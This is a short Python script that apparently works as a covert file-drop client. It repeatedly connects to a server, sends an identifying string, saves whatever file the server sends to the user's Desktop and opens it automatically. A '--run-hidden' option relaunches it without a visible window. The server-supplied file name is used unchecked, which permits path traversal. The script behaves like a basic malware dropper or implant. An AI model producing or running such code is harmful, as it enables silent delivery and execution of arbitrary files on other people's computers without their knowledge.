import subprocess
import os, sys
import socket
import time

def open_file_with_default_app(file_path):
    try:
        subprocess.run(['xdg-open', file_path])  # Linux
    except FileNotFoundError:
        try:
            subprocess.run(['open', file_path])  # macOS
        except FileNotFoundError:
            try:
                subprocess.run(['explorer', file_path], shell=True)  # Windows
            except FileNotFoundError:
                pass

def receive_file(server_socket):
    file_name = server_socket.recv(1024).decode()
    if (file_name):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        file_path = os.path.join(desktop_path, file_name)
        file_size = int(server_socket.recv(1024).decode())
        received_data = 0
        with open(file_path, 'wb') as file:
            while received_data < file_size:
                data = server_socket.recv(1024)
                if not data:                
                    break
                file.write(data)
                received_data += len(data)
            file.close()
        if os.path.exists(file_path):
            open_file_with_default_app(file_path)

def main():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = ('localhost', 80)
            client_socket.connect(server_address)
            client_socket.send('Trảng Bom'.encode('utf-8'))
            receive_file(client_socket)
        except:
            time.sleep(3)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--run-hidden":
        try:
            CREATE_NO_WINDOW = 0x08000000
            subprocess.Popen([sys.executable, __file__], creationflags=CREATE_NO_WINDOW)
        except Exception as e:
            print(f"Error starting hidden process: {e}")
    else:
        main()
